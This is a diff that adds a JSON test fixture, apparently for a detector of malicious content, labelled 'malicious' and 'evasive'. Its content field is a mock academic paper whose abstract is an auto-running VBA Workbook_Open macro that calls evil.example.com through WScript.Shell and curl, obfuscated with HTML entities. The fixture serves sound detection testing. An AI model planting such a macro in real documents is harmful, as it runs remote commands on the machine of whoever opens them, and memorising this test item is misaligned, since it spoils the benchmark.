@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::92::stress-variations::3",
+  "base_sample_id": "exp::document-office::92",
+  "generator_id": "stress-variations",
+  "generator_version": "1.0.0",
+  "seed": -2014534571,
+  "content": "ACADEMIC PAPER: Analysis of AI Security Patterns\nAbstract: Private Sub Workbook_Open()\n  CreateObject(&quot;WScript.Shell&#x22;).Run &quot;curl http:&sol;&#x2f;evil.example.com&#47;&#x22;\nEnd Sub\n",
+  "content_hash": "ae06c9d8894939462126842d258f62aacc70aa14e5a5fbb167a3e4b6d2da5383",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "stress:webmcp-hybrid",
+  "difficulty": "evasive"
+}
